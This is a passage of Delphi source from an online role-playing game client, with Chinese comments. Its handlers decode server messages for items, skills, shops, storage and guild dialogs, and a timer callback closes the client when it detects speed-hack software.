        End;
      6: DScreen.AddChatBoardString('[升级失败]：装备属性清零。',
          clwhite, clRed);
    Else
      DScreen.AddChatBoardString('[升级成功]：装备属性增强了。',
        clwhite, clBlue);
    End;
    If (body <> '') Then
    Begin
      DecodeBuffer(body, @cu, sizeof(TClientItem));
      g_LevelItemArr[0] := cu;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetLevelItms'); //程序自动增加
  End; //程序自动增加
End;

{procedure TfrmMain.ClientGetSendAddUseItems (body: string);
var
   index: integer;
   str, data: string;
   cu: TClientItem;
begin
Try //程序自动增加
   while TRUE do begin
      if body = '' then break;
      body := GetValidStr3 (body, str, ['/']);
      body := GetValidStr3 (body, data, ['/']);
      index := Str_ToInt (str, -1);
      if index in [9..12] then begin
         DecodeBuffer (data, @cu, sizeof(TClientItem));
         g_UseItems[index] := cu;
      end;
   end;
Except //程序自动增加
  DebugOutStr('[Exception] TfrmMain.ClientGetSendAddUseItems'); //程序自动增加
End; //程序自动增加
                end;    }

Procedure TfrmMain.ClientGetSendHeroItems(body: String);
Var
  index: integer;
  str, data: String;
  cu: TClientItem;
Begin
  Try //程序自动增加
    FillChar(g_HeroUseItems, sizeof(TClientItem) * 13, #0);
    While TRUE Do
    Begin
      If body = '' Then
        break;
      body := GetValidStr3(body, str, ['/']);
      body := GetValidStr3(body, data, ['/']);
      index := Str_ToInt(str, -1);
      If index In [0..MAXUSEITEMS] Then
      Begin
        DecodeBuffer(data, @cu, sizeof(TClientItem));
        g_HeroUseItems[index] := cu;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSendHeroItems');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetSenduseItems(body: String);
Var
  index: integer;
  str, data: String;
  cu: TClientItem;
Begin
  Try //程序自动增加
    FillChar(g_UseItems, sizeof(TClientItem) * 13, #0);
    //   FillChar (UseItems, sizeof(TClientItem)*9, #0);
    While TRUE Do
    Begin
      If body = '' Then
        break;
      body := GetValidStr3(body, str, ['/']);
      body := GetValidStr3(body, data, ['/']);
      index := Str_ToInt(str, -1);
      If index In [0..MAXUSEITEMS] Then
      Begin
        DecodeBuffer(data, @cu, sizeof(TClientItem));
        g_UseItems[index] := cu;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSenduseItems');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetAddMagic(body: String);
Var
  pcm: PTClientMagic;
Begin
  Try //程序自动增加
    new(pcm);
    DecodeBuffer(body, @(pcm^), sizeof(TClientMagic));
    g_MyMagic[pcm.Def.wMagicID] := pcm;
    g_MagicList.Add(pcm);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetAddMagic'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetDelMagic(magid: integer);
Var
  i: integer;
Begin
  Try //程序自动增加
    For i := g_MagicList.Count - 1 Downto 0 Do
    Begin
      If PTClientMagic(g_MagicList[i]).Def.wMagicId = magid Then
      Begin
        Dispose(PTClientMagic(g_MagicList[i]));
        g_MyMagic[magid] := Nil;
        g_MagicList.Delete(i);
        break;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetDelMagic'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetHeroAddMagic(body: String);
Var
  pcm: PTClientMagic;
Begin
  Try //程序自动增加
    new(pcm);
    DecodeBuffer(body, @(pcm^), sizeof(TClientMagic));
    g_HeroMagicList.Add(pcm);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetHeroAddMagic');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetHeroDelMagic(magid: integer);
Var
  i: integer;
Begin
  Try //程序自动增加
    For i := g_HeroMagicList.Count - 1 Downto 0 Do
    Begin
      If PTClientMagic(g_HeroMagicList[i]).Def.wMagicId = magid Then
      Begin
        Dispose(PTClientMagic(g_HeroMagicList[i]));
        g_HeroMagicList.Delete(i);
        break;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetHeroDelMagic');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetBooks(id: integer);
Var
  d: TDirectDrawSurface;
Begin
  Try //程序自动增加
    FrmDlg.m_nOpenBooksIdx := id;
    FrmDlg.m_nBooksIdx := 0;
    If id = 0 Then
    Begin
      d := g_UIBImages.Images[13];
      If d <> Nil Then
      Begin
        FrmDlg.DWBooks.Width := d.Width;
        FrmDlg.DWBooks.Height := d.Height;
        FrmDlg.DWBooks.Left := (SCREENWIDTH - d.Width) Div 2;
        ;
        FrmDlg.DWBooks.Top := (SCREENHEIGHT - d.Height) Div 8;
        FrmDlg.DWBooks.FaceIndex := 13;
      End;
      d := g_UIBImages.Images[16];
      If d <> Nil Then
      Begin
        FrmDlg.DBookNext.Width := d.Width;
        FrmDlg.DBookNext.Height := d.Height;
        FrmDlg.DBookNext.Left := 410;
        FrmDlg.DBookNext.top := 320;
        FrmDlg.DBookNext.FaceIndex := 16;
      End;
      FrmDlg.DBookPrior.Visible := False;
      FrmDlg.DBookNext.Visible := True;
      FrmDlg.DWBooks.Visible := True;
    End
    Else If id In [1..5] Then
    Begin
      FrmDlg.m_nBooksIdx := 255;
      FrmDlg.DBookPrior.Visible := False;
      FrmDlg.DBookNext.Visible := False;
      d := g_UIBImages.Images[id + 6];
      If d <> Nil Then
      Begin
        FrmDlg.DWBooks.Width := d.Width;
        FrmDlg.DWBooks.Height := d.Height;
        FrmDlg.DWBooks.Left := (SCREENWIDTH - d.Width) Div 2;
        ;
        FrmDlg.DWBooks.Top := (SCREENHEIGHT - d.Height) Div 8;
        FrmDlg.DWBooks.FaceIndex := id + 6;
      End;
      FrmDlg.DWBooks.Visible := True;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetHeroDelMagic');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetHeroMagics(body: String);
Var
  i: integer;
  data: String;
  pcm: PTClientMagic;
Begin
  Try //程序自动增加
    For i := 0 To g_HeroMagicList.Count - 1 Do
      Dispose(PTClientMagic(g_HeroMagicList[i]));
    g_HeroMagicList.Clear;
    While TRUE Do
    Begin
      If body = '' Then
        break;
      body := GetValidStr3(body, data, ['/']);
      If data <> '' Then
      Begin
        new(pcm);
        DecodeBuffer(data, @(pcm^), sizeof(TClientMagic));
        g_HeroMagicList.Add(pcm);
      End
      Else
        break;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetHeroMagics'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetMyMagics(body: String);
Var
  i: integer;
  data: String;
  pcm: PTClientMagic;
Begin
  Try //程序自动增加
    For i := 0 To g_MagicList.Count - 1 Do
      Dispose(PTClientMagic(g_MagicList[i]));
    g_MagicList.Clear;
    For i := Low(g_MyMagic) To High(g_MyMagic) Do
      g_MyMagic[I] := Nil;
    //FillChar(g_MyMagic,SizeOf(g_MyMagic),#0);
    While TRUE Do
    Begin
      If body = '' Then
        break;
      body := GetValidStr3(body, data, ['/']);
      If data <> '' Then
      Begin
        new(pcm);
        DecodeBuffer(data, @(pcm^), sizeof(TClientMagic));
        g_MyMagic[pcm.Def.wMagicID] := pcm;
        g_MagicList.Add(pcm);

        //    PlayScene.MemoLog.Lines.Add(pcm.Def.sMagicName + IntToStr(MagicList.Count));
      End
      Else
        break;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetMyMagics'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetHeroBabDuraChange(Idx, Dura, MaxDura: integer);
Var
  I: Integer;
Begin
  Try //程序自动增加
    For I := High(g_HeroItemArr) Downto Low(g_HeroItemArr) Do
    Begin
      If (g_HeroItemArr[I].MakeIndex = Idx) And (g_HeroItemArr[I].S.Name <> '')
        Then
      Begin
        g_HeroItemArr[I].Dura := Dura;
        g_HeroItemArr[I].DuraMax := MaxDura;
      End;
    End;
    If g_MovingItem.Item.MakeIndex = Idx Then
    Begin
      g_MovingItem.Item.Dura := Dura;
      g_MovingItem.Item.DuraMax := MaxDura;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetHeroBabDuraChange');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetBabInfoChange(Idx, Dura, MaxDura: integer; body:
  String);
Var
  I: Integer;
Begin
  Try //程序自动增加

    For I := High(g_ItemArr) Downto Low(g_ItemArr) Do
    Begin
      If (g_ItemArr[I].MakeIndex = Idx) And (g_ItemArr[I].S.Name <> '') Then
      Begin
        DecodeBuffer(body, @g_ItemArr[I], sizeof(TClientItem));
        exit;
      End;
    End;
    If g_MovingItem.Item.MakeIndex = Idx Then
    Begin
      DecodeBuffer(body, @g_MovingItem.Item, sizeof(TClientItem));
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetBabInfoChange');
    //程序自动增加
  End; //程序自动增加
End;

//背包物品改变持久

Procedure TfrmMain.ClientGetBabDuraChange(Idx, Dura, MaxDura: integer);
Var
  I: Integer;
Begin
  Try //程序自动增加
    For I := High(g_ItemArr) Downto Low(g_ItemArr) Do
    Begin
      If (g_ItemArr[I].MakeIndex = Idx) And (g_ItemArr[I].S.Name <> '') Then
      Begin
        g_ItemArr[I].Dura := Dura;
        g_ItemArr[I].DuraMax := MaxDura;
        exit;
      End;
    End;
    If g_MovingItem.Item.MakeIndex = Idx Then
    Begin
      g_MovingItem.Item.Dura := Dura;
      g_MovingItem.Item.DuraMax := MaxDura;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetBabDuraChange');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetHeroMagicLvExp(magid, maglv, magtrain: integer);
Var
  i: integer;
Begin
  Try //程序自动增加
    For i := g_HeroMagicList.Count - 1 Downto 0 Do
    Begin
      If PTClientMagic(g_HeroMagicList[i]).Def.wMagicId = magid Then
      Begin
        PTClientMagic(g_HeroMagicList[i]).Level := maglv;
        PTClientMagic(g_HeroMagicList[i]).CurTrain := magtrain;
        break;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetHeroMagicLvExp');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetCloseHero();
Var
  //  OldHero:THumActor;
  I: integer;
Begin
  Try //程序自动增加
    PlayScene.DeleteActor(g_HeronRecogId);
    FrmDlg.DHeroDlg.Visible := False;
    FrmDlg.DHeroStateWindow.Visible := False;
    FrmDlg.DHeroItemBag.Visible := False;
    g_HeroDander := 0;
    g_HeroDanderOk := False;
    FillChar(g_HeroUseItems, sizeof(TClientItem) * 14, #0);
    FillChar(g_HeroItemArr, sizeof(TClientItem) * MAXBAGITEMCL, #0);
    For i := 0 To g_HeroMagicList.Count - 1 Do
      Dispose(PTClientMagic(g_HeroMagicList[i]));
    g_HeroMagicList.Clear;
    g_HeronRecogId := 0;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetCloseHero'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetMagicLvExp(magid, maglv, magtrain: integer);
Var
  i: integer;
Begin
  Try //程序自动增加
    For i := g_MagicList.Count - 1 Downto 0 Do
    Begin
      If PTClientMagic(g_MagicList[i]).Def.wMagicId = magid Then
      Begin
        PTClientMagic(g_MagicList[i]).Level := maglv;
        PTClientMagic(g_MagicList[i]).CurTrain := magtrain;
        break;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetMagicLvExp'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetHeroDuraChange(uidx, newdura, newduramax: integer);
Begin
  Try //程序自动增加
    If uidx In [0..MAXUSEITEMS] Then
    Begin
      If g_HeroUseItems[uidx].S.Name <> '' Then
      Begin
        g_HeroUseItems[uidx].Dura := newdura;
        g_HeroUseItems[uidx].DuraMax := newduramax;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetHeroDuraChange');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetDuraChange(uidx, newdura, newduramax: integer);
Begin
  Try //程序自动增加
    If uidx In [0..MAXUSEITEMS] Then
    Begin
      If g_UseItems[uidx].S.Name <> '' Then
      Begin
        g_UseItems[uidx].Dura := newdura;
        g_UseItems[uidx].DuraMax := newduramax;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetDuraChange'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetMerchantSay(merchant, face: integer; saying:
  String);
Var
  npcname: String;
Begin
  Try //程序自动增加
    g_nMDlgX := g_MySelf.m_nCurrX;
    g_nMDlgY := g_MySelf.m_nCurrY;
    If g_nCurMerchant <> merchant Then
    Begin
      g_nCurMerchant := merchant;
      FrmDlg.ResetMenuDlg;
      FrmDlg.CloseMDlg;
    End;
    //   ShowMessage(saying);
    saying := GetValidStr3(saying, npcname, ['/']);
    FrmDlg.ShowMDlg(face, npcname, saying);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetMerchantSay');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetSendGoodsList(merchant, count: integer; body:
  String);
Var
  //   i: integer;
     {data,}gname, gsub, gprice, gstock: String;
  pcg: PTClientGoods;
Begin
  Try //程序自动增加
    FrmDlg.ResetMenuDlg;

    g_nCurMerchant := merchant;
    With FrmDlg Do
    Begin
      //deocde body received from server
      body := DecodeString(body);
      While body <> '' Do
      Begin
        body := GetValidStr3(body, gname, ['/']);
        body := GetValidStr3(body, gsub, ['/']);
        body := GetValidStr3(body, gprice, ['/']);
        body := GetValidStr3(body, gstock, ['/']);
        If (gname <> '') And (gprice <> '') And (gstock <> '') Then
        Begin
          new(pcg);
          pcg.Name := gname;
          pcg.SubMenu := Str_ToInt(gsub, 0);
          pcg.Price := Str_ToInt(gprice, 0);
          pcg.Stock := Str_ToInt(gstock, 0);
          pcg.Grade := -1;
          MenuList.Add(pcg);
        End
        Else
          break;
      End;
      FrmDlg.ShowShopMenuDlg;
      FrmDlg.CurDetailItem := '';
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSendGoodsList');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetSendMakeDrugList(merchant: integer; body: String);
Var
  //   i: integer;
     {data,}gname, gsub, gprice, gstock: String;
  pcg: PTClientGoods;
Begin
  Try //程序自动增加
    FrmDlg.ResetMenuDlg;

    g_nCurMerchant := merchant;
    With FrmDlg Do
    Begin
      //clear shop menu list
      //deocde body received from server
      body := DecodeString(body);
      While body <> '' Do
      Begin
        body := GetValidStr3(body, gname, ['/']);
        body := GetValidStr3(body, gsub, ['/']);
        body := GetValidStr3(body, gprice, ['/']);
        body := GetValidStr3(body, gstock, ['/']);
        If (gname <> '') And (gprice <> '') And (gstock <> '') Then
        Begin
          new(pcg);
          pcg.Name := gname;
          pcg.SubMenu := Str_ToInt(gsub, 0);
          pcg.Price := Str_ToInt(gprice, 0);
          pcg.Stock := Str_ToInt(gstock, 0);
          pcg.Grade := -1;
          MenuList.Add(pcg);
        End
        Else
          break;
      End;
      FrmDlg.ShowShopMenuDlg;
      FrmDlg.CurDetailItem := '';
      FrmDlg.BoMakeDrugMenu := TRUE;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSendMakeDrugList');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetSendUserSell(merchant: integer; nCls: Word);
Begin
  Try //程序自动增加
    FrmDlg.CloseDSellDlg;
    g_nCurMerchant := merchant;
    FrmDlg.SpotDlgMode := dmSell;
    If nCls = 255 Then
      FrmDlg.SpotDlgMode := dmSellOff;
    FrmDlg.ShowShopSellDlg;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSendUserSell');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetSendUserRepair(merchant: integer);
Begin
  Try //程序自动增加
    FrmDlg.CloseDSellDlg;
    g_nCurMerchant := merchant;
    FrmDlg.SpotDlgMode := dmRepair;
    FrmDlg.ShowShopSellDlg;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSendUserRepair');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetSendPlayDrink(merchant: integer);
Begin
  FrmDlg.CloseDSellDlg;
  g_nCurMerchant := merchant;
  FrmDlg.SpotDlgMode := dmPlayDrink;
  FrmDlg.ShowShopSellDlg;
End;

Procedure TfrmMain.ClientGetSendUserStorage(merchant: integer);
Begin
  Try //程序自动增加
    FrmDlg.CloseDSellDlg;
    g_nCurMerchant := merchant;
    FrmDlg.SpotDlgMode := dmStorage;
    FrmDlg.ShowShopSellDlg;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSendUserStorage');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetRegInfo(Msg: pTDefaultMessage; Body: String);
Begin
  Try //程序自动增加
    DecodeBuffer(Body, @g_RegInfo, SizeOf(TRegInfo));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetRegInfo'); //程序自动增加
  End; //程序自动增加
End;
{var
   i: integer;
   data: string;
   pcm: PTClientMagic;
begin
   for i:=0 to g_MagicList.Count-1 do
      Dispose (PTClientMagic (g_MagicList[i]));
   g_MagicList.Clear;
   while TRUE do begin
      if body = '' then break;
      body := GetValidStr3 (body, data, ['/']);
      if data <> '' then begin
         new (pcm);
         DecodeBuffer (data, @(pcm^), sizeof(TClientMagic));
         g_MagicList.Add (pcm);

//    PlayScene.MemoLog.Lines.Add(pcm.Def.sMagicName + IntToStr(MagicList.Count));
      end else
         break;
   end;  }

Procedure TfrmMain.ClientShopList(Body: String);
Var
  //   i: integer;
  data: String;
  pcm: pTNewFileItem;
Begin
  Try //程序自动增加
    {if boTop then begin
      for i:=0 to g_ShopTopList.Count-1 do
        Dispose (pTFileItem(g_ShopTopList[i]));
      g_ShopTopList.Clear;  }
    While TRUE Do
    Begin
      If body = '' Then
        break;
      body := GetValidStr3(body, data, ['/']);
      If data <> '' Then
      Begin
        new(pcm);
        DecodeBuffer(data, @(pcm^), sizeof(TNewFileItem));
        Case pcm.Idx Of
          0: g_ShopList1.Add(pcm);
          1: g_ShopList2.Add(pcm);
          2: g_ShopList3.Add(pcm);
          3: g_ShopList4.Add(pcm);
          4: g_ShopList5.Add(pcm);
          5: g_ShopTopList.Add(pcm);
        End;
      End
      Else
        break;
    End;

    {end else begin
    end; }
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientShopList'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetSaveItemList2(merchant: integer; bodystr: String);
Var
  data: String;
  pc: PTClientItem;
  pcg: PTClientGoods;
Begin
  Try
    While TRUE Do
    Begin
      If bodystr = '' Then
        break;
      bodystr := GetValidStr3(bodystr, data, ['/']);
      If data <> '' Then
      Begin
        new(pc);
        DecodeBuffer(data, @(pc^), sizeof(TClientItem));
        g_SaveItemList.Add(pc);
        new(pcg);
        pcg.Name := pc.S.Name;
        pcg.SubMenu := 0;
        pcg.Price := pc.MakeIndex;
        pcg.Stock := Round(pc.Dura / 1000);
        pcg.Grade := Round(pc.DuraMax / 1000);
        FrmDlg.MenuList.Add(pcg);
      End
      Else
        break;
    End;
  Except
    DebugOutStr('[Exception] TfrmMain.ClientGetSaveItemList2');
  End;
End;

Procedure TfrmMain.ClientGetSaveItemList(merchant: integer; bodystr: String);
Var
  i: integer;
  data: String;
  pc: PTClientItem;
  pcg: PTClientGoods;
Begin
  Try //程序自动增加
    FrmDlg.ResetMenuDlg;

    For i := 0 To g_SaveItemList.Count - 1 Do
      Dispose(PTClientItem(g_SaveItemList[i]));
    g_SaveItemList.Clear;

    While TRUE Do
    Begin
      If bodystr = '' Then
        break;
      bodystr := GetValidStr3(bodystr, data, ['/']);
      If data <> '' Then
      Begin
        new(pc);
        DecodeBuffer(data, @(pc^), sizeof(TClientItem));
        g_SaveItemList.Add(pc);
      End
      Else
        break;
    End;

    g_nCurMerchant := merchant;
    With FrmDlg Do
    Begin
      //deocde body received from server
      For i := 0 To g_SaveItemList.Count - 1 Do
      Begin
        new(pcg);
        pcg.Name := PTClientItem(g_SaveItemList[i]).S.Name;
        pcg.SubMenu := 0;
        pcg.Price := PTClientItem(g_SaveItemList[i]).MakeIndex;
        pcg.Stock := Round(PTClientItem(g_SaveItemList[i]).Dura / 1000);
        pcg.Grade := Round(PTClientItem(g_SaveItemList[i]).DuraMax / 1000);
        MenuList.Add(pcg);
      End;
      FrmDlg.ShowShopMenuDlg;
      FrmDlg.BoStorageMenu := TRUE;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSaveItemList');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetSendDetailGoodsList(merchant, count, topline:
  integer; bodystr: String);
Var
  i: integer;
  {body,}data { gname, gprice, gstock, ggrade}: String;
  pcg: PTClientGoods;
  pc: PTClientItem;
Begin
  Try //程序自动增加
    FrmDlg.ResetMenuDlg;

    g_nCurMerchant := merchant;

    bodystr := DecodeString(bodystr);
    While TRUE Do
    Begin
      If bodystr = '' Then
        break;
      bodystr := GetValidStr3(bodystr, data, ['/']);
      If data <> '' Then
      Begin
        new(pc);
        DecodeBuffer(data, @(pc^), sizeof(TClientItem));
        g_MenuItemList.Add(pc);
      End
      Else
        break;
    End;

    With FrmDlg Do
    Begin
      //clear shop menu list
      For i := 0 To g_MenuItemList.Count - 1 Do
      Begin
        new(pcg);
        pcg.Name := PTClientItem(g_MenuItemList[i]).S.Name;
        pcg.SubMenu := 0;
        pcg.Price := PTClientItem(g_MenuItemList[i]).DuraMax;
        pcg.Stock := PTClientItem(g_MenuItemList[i]).MakeIndex;
        pcg.Grade := Round(PTClientItem(g_MenuItemList[i]).Dura / 1000);
        MenuList.Add(pcg);
      End;
      FrmDlg.ShowShopMenuDlg;
      FrmDlg.BoDetailMenu := TRUE;
      FrmDlg.MenuTopLine := topline;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSendDetailGoodsList');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetSendNotice(body: String);
Var
  data, msgstr: String;
  Recog: integer;
  param, tag: Word;
Begin
  Try //程序自动增加
    g_boDoFastFadeOut := FALSE;
    msgstr := '';
    body := DecodeString(body);
    While TRUE Do
    Begin
      If body = '' Then
        break;
      body := GetValidStr3(body, data, [#27]);
      msgstr := msgstr + data + '\';
    End;
    FrmDlg.DialogSize := 2;
    If FrmDlg.DMessageDlg(msgstr, [mbOk]) = mrOk Then
    Begin
      Recog := VERSION_NUMBER;
      tag := Random(10) + 1;
      param := MakeWord(tag, Random(255) + 1);
      SendClientMessage(CM_LOGINNOTICEOKEX, Recog, param, tag, TOOLVER);
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSendNotice'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetGroupMembers(bodystr: String);
Var
  memb: String;
Begin
  Try //程序自动增加
    g_GroupMembers.Clear;
    While TRUE Do
    Begin
      If bodystr = '' Then
        break;
      bodystr := GetValidStr3(bodystr, memb, ['/']);
      If memb <> '' Then
        g_GroupMembers.Add(memb)
      Else
        break;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetGroupMembers');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetOpenGuildDlg(bodystr: String);
Var
  str, data, linestr, s1: String;
  pstep: integer;
Begin
  Try //程序自动增加
    If g_boShowMemoLog Then
      PlayScene.MemoLog.Lines.Add('ClientGetOpenGuildDlg');

    str := DecodeString(bodystr);
    str := GetValidStr3(str, FrmDlg.Guild, [#13]);
    str := GetValidStr3(str, FrmDlg.GuildFlag, [#13]);
    str := GetValidStr3(str, data, [#13]);
    If data = '1' Then
      FrmDlg.GuildCommanderMode := TRUE
    Else
      FrmDlg.GuildCommanderMode := FALSE;

    FrmDlg.GuildStrs.Clear;
    FrmDlg.GuildNotice.Clear;
    pstep := 0;
    While TRUE Do
    Begin
      If str = '' Then
        break;
      str := GetValidStr3(str, data, [#13]);
      If data = '<Notice>' Then
      Begin
        FrmDlg.GuildStrs.AddObject('□公告', TObject(clWhite));
        FrmDlg.GuildStrs.Add(' ');
        pstep := 1;
        continue;
      End;
      If data = '<KillGuilds>' Then
      Begin
        FrmDlg.GuildStrs.Add(' ');
        FrmDlg.GuildStrs.AddObject('□敌对行会', TObject(clWhite));
        FrmDlg.GuildStrs.Add(' ');
        pstep := 2;
        linestr := '';
        continue;
      End;
      If data = '<AllyGuilds>' Then
      Begin
        If linestr <> '' Then
          FrmDlg.GuildStrs.Add(linestr);
        linestr := '';
        FrmDlg.GuildStrs.Add(' ');
        FrmDlg.GuildStrs.AddObject('□联盟行会', TObject(clWhite));
        FrmDlg.GuildStrs.Add(' ');
        pstep := 3;
        continue;
      End;

      If pstep = 1 Then
        FrmDlg.GuildNotice.Add(data);

      If data <> '' Then
      Begin
        If data[1] = '<' Then
        Begin
          ArrestStringEx(data, '<', '>', s1);
          If s1 <> '' Then
          Begin
            FrmDlg.GuildStrs.Add(' ');
            FrmDlg.GuildStrs.AddObject(char(7) + s1, TObject(clWhite));
            FrmDlg.GuildStrs.Add(' ');
            continue;
          End;
        End;
      End;
      If (pstep = 2) Or (pstep = 3) Then
      Begin
        If Length(linestr) > 80 Then
        Begin
          FrmDlg.GuildStrs.Add(linestr);
          linestr := '';
        End
        Else
          linestr := linestr + fmstr(data, 18);
        continue;
      End;

      FrmDlg.GuildStrs.Add(data);
    End;

    If linestr <> '' Then
      FrmDlg.GuildStrs.Add(linestr);

    FrmDlg.ShowGuildDlg;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetOpenGuildDlg');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetSendGuildMemberList(body: String);
Var
  str, data, rankname, members: String;
  rank: integer;
Begin
  Try //程序自动增加
    str := DecodeString(body);
    FrmDlg.GuildStrs.Clear;
    FrmDlg.GuildMembers.Clear;
    rank := 0;
    While TRUE Do
    Begin
      If str = '' Then
        break;
      str := GetValidStr3(str, data, ['/']);
      If data <> '' Then
      Begin
        If data[1] = '#' Then
        Begin
          rank := Str_ToInt(Copy(data, 2, Length(data) - 1), 0);
          continue;
        End;
        If data[1] = '*' Then
        Begin
          If members <> '' Then
            FrmDlg.GuildStrs.Add(members);
          rankname := Copy(data, 2, Length(data) - 1);
          members := '';
          FrmDlg.GuildStrs.Add(' ');
          If FrmDlg.GuildCommanderMode Then
            FrmDlg.GuildStrs.AddObject(fmStr('(' + IntToStr(rank) + ')', 3) + '<'
              + rankname + '>', TObject(clWhite))
          Else
            FrmDlg.GuildStrs.AddObject('<' + rankname + '>', TObject(clWhite));
          FrmDlg.GuildMembers.Add('#' + IntToStr(rank) + ' <' + rankname + '>');
          continue;
        End;
        If Length(members) > 80 Then
        Begin
          FrmDlg.GuildStrs.Add(members);
          members := '';
        End;
        members := members + FmStr(data, 18);
        FrmDlg.GuildMembers.Add(data);
      End;
    End;
    If members <> '' Then
      FrmDlg.GuildStrs.Add(members);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSendGuildMemberList');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TimeProc(uTimerID, uMessage: UINT;
  dwUser, dw1, dw2: DWORD) Stdcall;
Var
  Counter, CounterNum: Int64;
  ATimer, CTimer: Integer;
Begin
  If g_MySelf <> Nil Then
  Begin
    QueryPerformanceCounter(Counter);
    CounterNum := Counter - OldCounter;
    OldCounter := Counter;
    ATimer := Trunc(CounterNum / Frequency * 1000);
    CTimer := 2000 - (GetTickCount - g_dwSHGetTime);
    //DScreen.AddSysMsg(IntToStr(2000-(GetTickCount - g_dwSHGetTime)));
    If (g_AspeederTime > 0) And ((ATimer < g_AspeederTime) Or (CTimer <
      g_AspeederTime)) Then
    Begin
      FrmMain.CSocket.Close;
      FrmDlg.DMessageDlg(
        '请确认您是否运行了加速软件\' +
        '既将关闭游戏客户端\' +
        '请重新连接游戏服务器.',
        [mbOk]);

      FrmMain.Close;
      PostMessage(FrmMain.Handle, WM_CLOSE, 0, 0);
    End;
  End;
  g_dwSHGetTime := GetTickCount();
End;

Procedure TfrmMain.MinTimerTimer(Sender: TObject);
Var
  i: integer;

  //   timertime: longword;
Begin
  Try //程序自动增加
    {if g_MySelf<>Nil then begin
       ClearWMImagesLib();
    end; }
    //

    With PlayScene Do
      For i := 0 To m_ActorList.Count - 1 Do
      Begin
        If IsGroupMember(TActor(m_ActorList[i]).m_sUserName) Then
        Begin
          TActor(m_ActorList[i]).m_boGrouped := TRUE;
        End
        Else
          TActor(m_ActorList[i]).m_boGrouped := FALSE;
      End;
    For i := g_FreeActorList.Count - 1 Downto 0 Do
    Begin
      If GetTickCount - TActor(g_FreeActorList[i]).m_dwDeleteTime > 60000 Then
      Begin
        TActor(g_FreeActorList[i]).Free;
        g_FreeActorList.Delete(i);
      End;
    End;

  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.MinTimerTimer'); //程序自动增加
  End; //程序自动增加
End;

{$REGION '没用的'}
